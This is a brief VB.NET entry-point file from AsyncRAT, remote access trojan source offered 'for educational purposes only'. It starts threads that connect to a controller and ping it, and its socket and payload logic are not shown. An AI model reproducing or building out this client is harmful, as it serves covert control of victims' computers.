Public Class Main

    '

    '       │ Author     : NYAN CAT
    '       │ Name       : AsyncRAT

    '       Contact Me   : https://github.com/NYAN-x-CAT

    '       This program Is distributed for educational purposes only.

    '

    Public Shared Sub Main()
        Dim T1 As New Threading.Thread(AddressOf ClientSocket.BeginConnect)
        T1.Start()

        Dim T2 As New Threading.Thread(AddressOf ClientSocket.Ping)
        T2.Start()

    End Sub

End Class
